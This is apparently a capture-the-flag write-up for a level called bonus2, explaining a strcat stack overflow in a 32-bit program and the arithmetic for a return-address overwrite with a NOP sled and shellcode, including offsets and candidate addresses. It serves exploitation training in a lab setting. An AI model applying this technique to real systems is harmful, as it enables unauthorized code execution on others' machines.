solution bonus2:

-> the main holds a buffer of 72 bytes, which we'll call "buff", and a pointer to char which we'll call "lang"

-> the program leaves if we do not provide 2 arguments

-> all the bytes of "buff" are set to 0 before two calls to strncpy are made :
* the first one copies at most 40 bytes from argv[1] to "buff"
* the second one copies at most 32 bytes from argv[2] to "buff" + 40

-> next the result of the call to getenv("LANG") is stored in "lang"

-> the program then calls the function "greetuser", which allocates space on the stack to hold a 72 bytes buffer which we'll call "str"

-> this function works as follows:
* if the first 2 bytes of the "LANG" environment variable are "fi", a string of 18 bytes is copied into "str"
* else if the first 2 bytes are "nl", a string of 13 bytes is copied into "str"
* else if "LANG" exists, a string of 6 bytes is copied into "str"
* finally the program appends "buff" to "str" with strcat and displays "str" with puts

-> since "buff" can go up to 72 bytes, it is possible to overflow "str" with the strcat method and reach the return address of greetuser stored on the stack
to achieve this, we have to write into str[76] (72 bytes + saved ebp (4 bytes))

-> we are going to set "LANG" to "nl", so that "str" contains 13 bytes already, which means we only have to add 63 bytes to reach the return address

-> the first 40 bytes of "buff" copied from argv[1] will contain a NOP sled of 19 bytes and a shellcode of 21 bytes, while the 27 bytes copied from argv[2] will contain the address of redirection, which will point to somewhere inside the NOP sled
It is important to note that the stack usually starts higher outside of gdb because gdb's arguments and environment are bigger
by trial and error we find that there is a 32 byte difference between addresses in gdb and addresses outside gdb

The shellcode exists in 3 different places: in "buff", at main's esp ("buff" is copied before the call to greetuser), and in "str"
when LANG is set to "nl", and argv[1] is 40 bytes, and argv[2] is 27 bytes, main's esp is 0xbffff600, "buff" is at 0xbffff650, and "str" is at 0xbffff5b0

-> So the payload address can be :
- address of "str" + 13 bytes ("Goedemiddag! ") + 9 bytes (middle of NOP-sled) + 32 bytes (gdb diff) :
0xbffff5b0 + 13 + 9 + 32 = 0xbffff5e6

- main's esp + 9 bytes + 32 bytes :
0xbffff600 + 9 + 32 = 0xbffff629

- address of "buff" + 9 bytes + 32 bytes :
0xbffff650 + 9 + 32 = 0xbffff679
